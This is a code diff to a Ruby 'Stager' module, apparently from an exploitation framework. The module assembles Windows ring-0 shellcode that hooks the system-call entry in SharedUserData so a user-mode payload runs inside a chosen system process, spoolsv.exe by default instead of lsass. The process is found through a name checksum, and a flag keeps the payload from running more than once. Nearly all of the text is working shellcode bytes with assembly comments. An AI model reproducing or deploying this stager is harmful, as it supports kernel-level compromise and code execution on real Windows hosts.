@@ -25,16 +25,28 @@ module Stager
 	def self.sud_syscall_hook(opts = {})
 		r0_recovery = opts['RecoveryStub'] || Recovery.default
 		r3_payload  = opts['UserModeStub'] || ''
-		r3_prefix   = _run_only_in_lsass_stub("\xff\x25\x08\x03\xfe\x7f")
+		r3_prefix   = _run_only_in_win32proc_stub("\xff\x25\x08\x03\xfe\x7f", opts)
 		r3_size     = ((r3_prefix.length + r3_payload.length + 3) & ~0x3) / 4
-
+		
 		r0_stager =
-			"\xeb" + [0x1d + r0_recovery.length].pack('C') +
-			"\xbb\x01\x03\xdf\xff\x4b\xfc\x8d\x7b\x7c\x5e" +
-			"\x6a" + [r3_size].pack('C')  + "\x59\xf3\xa5\x8b\x03" +
-			"\x8d\x4b\x08\x89\x01\xc7\x03\x7c\x03\xfe\x7f" + 
+			"\xEB" + [0x22 + r0_recovery.length].pack('C') + # jmp short 0x27
+			"\xBB\x01\x03\xDF\xFF"                         + # mov ebx,0xffdf0301
+			"\x4B"                                         + # dec ebx
+			"\xFC"                                         + # cld
+			"\x8D\x7B\x7C"                                 + # lea edi,[ebx+0x7c]
+			"\x5E"                                         + # pop esi
+			"\x6A" + [r3_size].pack('C')                   + # push byte num_dwords
+			"\x59"                                         + # pop ecx
+			"\xF3\xA5"                                     + # rep movsd
+			"\xBF\x7C\x03\xFE\x7F"                         + # mov edi,0x7ffe037c
+			"\x39\x3B"                                     + # cmp [ebx],edi
+			"\x74\x09"                                     + # jz 
+			"\x8B\x03"                                     + # mov eax,[ebx]
+			"\x8D\x4B\x08"                                 + # lea ecx,[ebx+0x8]
+			"\x89\x01"                                     + # mov [ecx],eax
+			"\x89\x3B"                                     + # mov [ebx],edi
 			r0_recovery +
-			"\xe8" + [0xffffffde - r0_recovery.length].pack('V') +
+			"\xe8" + [0xffffffd9 - r0_recovery.length].pack('V') + # call 0x2
 			r3_prefix +
 			r3_payload
 
@@ -45,36 +57,46 @@ protected
 
 	#
 	# This stub is used by stagers to check to see if the code is
-	# runing in the context of lsass.  If it isn't, it runs the code
+	# running in the context of a user-mode system process.  By default,
+	# this process is spoolsv.exe.  If it isn't, it runs the code
 	# specified by append.  Otherwise, it jumps past that code and
 	# into what should be the expected r3 payload to execute.  This
 	# stub also makes sure that the payload does not run more than
 	# once.
 	#
+	def self._run_only_in_win32proc_stub(append = '', opts = {}) 
+		opts['RunInWin32Process'] = "spoolsv.exe" if opts['RunInWin32Process'].nil?
 
-	# This little bit was written by jc. If there are bugs or something weird with this,
-	# check here first. 
-	def self._run_only_in_lsass_stub(append = '') 
-		"\x60" + 						# pushad
-		"\x8b\x1d\x3c\x00\x02\x00" +	# mov ebx, 0x0002003c
-		"\x83\xc3\x28" +				# add ebx, 0x28
-		"\x81\xfb\x00\x06\x02\x00" +	# cmp ebx 00020608
-		"\x7e\x28" +					# jl restore_regs+
-		"\x81\xfb\x00\x08\x02\x00" +	# cmp ebx, 00020800
-		"\x7d\x20" + 					# jg restore_regs
-		"\x8b\x0b" + 					# mov  ecx, [ebx] 
-		"\x03\x4b\x03"+					# add  ecx, [ebx+3]
-		"\x81\xf9\x6c\x61\x73\x73"+		# cmp ecx, 0x7373616c 
-		"\x75\x13"+ 					# jnz restore_regs
-		"\x6a\x30" +					# push byte 0x30
-		"\x5b\x64" +					# pop ebx
-		"\x8b\x1b"+ 					# mov  ebx, [fs:ebx]
-		"\x43\x43\x43" +				# inc ebx inc ebx inc ebx	
-		"\x80\x3b\x01" +				# cmp  byte [ebx], 0x1 check for has_been_run
-		"\x74\x05" +					# jz restore_regs
-		"\xc6\x03\x01"+					# mov  byte [ebx], 0x1 set has_been_run
-		"\xeb" + [append.length + 1].pack('C') +  # jmp stager
-		"\x61" + append						      # restore regs
+		process  = opts['RunInWin32Process'].downcase
+		checksum = 
+			process[0]         +
+			(process[2] << 8)  +
+			(process[1] << 16) +
+			(process[3] << 24)
+
+		"\x60"                                 + # pusha
+		"\x6A\x30"                             + # push byte +0x30
+		"\x58"                                 + # pop eax
+		"\x99"                                 + # cdq
+		"\x64\x8B\x18"                         + # mov ebx,[fs:eax]
+		"\x39\x53\x0C"                         + # cmp [ebx+0xc],edx
+		"\x74\x26"                             + # jz 0x5f
+		"\x8B\x5B\x10"                         + # mov ebx,[ebx+0x10]
+		"\x8B\x5B\x3C"                         + # mov ebx,[ebx+0x3c]
+		"\x83\xC3\x28"                         + # add ebx,byte +0x28
+		"\x8B\x0B"                             + # mov ecx,[ebx]
+		"\x03\x4B\x03"                         + # add ecx,[ebx+0x3]
+		"\x81\xF9" + [checksum].pack('V')      + # cmp ecx,prochash
+		"\x75\x10"                             + # jnz 0x5f
+		"\x64\x8B\x18"                         + # mov ebx,[fs:eax]
+		"\x43"                                 + # inc ebx
+		"\x43"                                 + # inc ebx
+		"\x43"                                 + # inc ebx
+		"\x80\x3B\x01"                         + # cmp byte [ebx],0x1
+		"\x74\x05"                             + # jz 0x5f
+		"\xC6\x03\x01"                         + # mov byte [ebx],0x1
+		"\xEB" + [append.length + 1].pack('C') + # jmp stager
+		"\x61" + append						        # restore regs
 	end
 
 
